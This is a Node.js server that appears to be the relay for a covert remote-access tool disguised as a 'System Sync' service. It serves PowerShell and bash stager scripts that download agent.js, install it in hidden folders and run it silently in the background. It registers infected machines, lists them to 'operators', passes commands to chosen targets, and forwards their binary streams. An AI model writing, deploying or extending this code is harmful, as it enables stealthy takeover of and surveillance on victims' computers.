const express = require("express");
const http = require("http");
const https = require("https");
const path = require("path");
const WebSocket = require("ws");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json({ limit: "16mb" }));

const server = http.createServer(app);
const wss = new WebSocket.Server({ server, maxPayload: 20 * 1024 * 1024 });

const hosts = new Map();
const operators = new Set();

function broadcastToOperators(payload) {
    const data = typeof payload === "string" ? payload : JSON.stringify(payload);
    for (const op of operators) {
        if (op.readyState === WebSocket.OPEN) op.send(data);
    }
}

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/health", (req, res) => res.status(200).json({ ok: true, nodes: hosts.size, ts: Date.now() }));

app.get("/init.ps1", (req, res) => {
    const host = req.headers.host || "sync-node-5024.onrender.com";
    const relayUrl = "wss://" + host;
    res.setHeader("Content-Type", "text/plain");
    res.send([
        "$ErrorActionPreference = 'SilentlyContinue'",
        "$workDir = Join-Path $env:LOCALAPPDATA 'SystemSync'",
        "New-Item -ItemType Directory -Force -Path $workDir | Out-Null",
        "Set-Location $workDir",
        "Invoke-WebRequest -Uri 'https://" + host + "/agent.js' -OutFile 'agent.js'",
        "npm init -y | Out-Null",
        "npm install ws --silent | Out-Null",
        "$env:RELAY_URL = '" + relayUrl + "'",
        "Start-Process -FilePath 'node' -ArgumentList 'agent.js' -WindowStyle Hidden"
    ].join("
"));
});

app.get("/init.sh", (req, res) => {
    const host = req.headers.host || "sync-node-5024.onrender.com";
    const relayUrl = "wss://" + host;
    res.setHeader("Content-Type", "text/plain");
    res.send([
        "#!/usr/bin/env bash",
        "mkdir -p ~/.local/share/.syssync && cd ~/.local/share/.syssync",
        "curl -fsSL https://" + host + "/agent.js -o agent.js",
        "npm init -y >/dev/null 2>&1",
        "npm install ws >/dev/null 2>&1",
        "RELAY_URL=" + relayUrl + " nohup node agent.js >/dev/null 2>&1 &"
    ].join("
"));
});

app.get("/agent.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.sendFile(path.join(__dirname, "agent_payload.js"));
});

wss.on("connection", (ws, req) => {
    const url = new URL(req.url, "http://" + req.headers.host);
    const role = url.searchParams.get("role");
    const hostId = url.searchParams.get("id") || ("node_" + Math.random().toString(36).slice(2, 8));

    if (role === "operator") {
        operators.add(ws);
        const list = [];
        for (const [id, info] of hosts.entries()) list.push({ id, meta: info.meta });
        ws.send(JSON.stringify({ type: "host_list", hosts: list }));

        ws.on("message", (raw) => {
            try {
                const msg = JSON.parse(raw);
                const target = hosts.get(msg.targetId);
                if (target && target.ws.readyState === WebSocket.OPEN) {
                    target.ws.send(JSON.stringify(msg));
                }
            } catch (e) {}
        });
        ws.on("close", () => operators.delete(ws));
    } else {
        const meta = {
            ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
            ua: req.headers["user-agent"] || "os-daemon",
            connectedAt: Date.now()
        };
        hosts.set(hostId, { ws, meta });
        broadcastToOperators({ type: "host_joined", id: hostId, meta });

        ws.on("message", (raw, isBinary) => {
            if (isBinary) {
                for (const op of operators) {
                    if (op.readyState === WebSocket.OPEN) op.send(raw, { binary: true });
                }
                return;
            }
            try {
                const msg = JSON.parse(raw);
                msg.hostId = hostId;
                broadcastToOperators(msg);
            } catch (e) {}
        });

        ws.on("close", () => {
            hosts.delete(hostId);
            broadcastToOperators({ type: "host_left", id: hostId });
        });
    }
});

const PUBLIC_URL = process.env.RENDER_EXTERNAL_URL || "https://sync-node-5024.onrender.com";
setInterval(() => {
    https.get(PUBLIC_URL + "/health", (res) => res.resume()).on("error", () => {});
}, 4 * 60 * 1000);

const PORT = process.env.PORT || 10000;
server.listen(PORT, "0.0.0.0", () => console.log("24/7 Relay listening on", PORT));
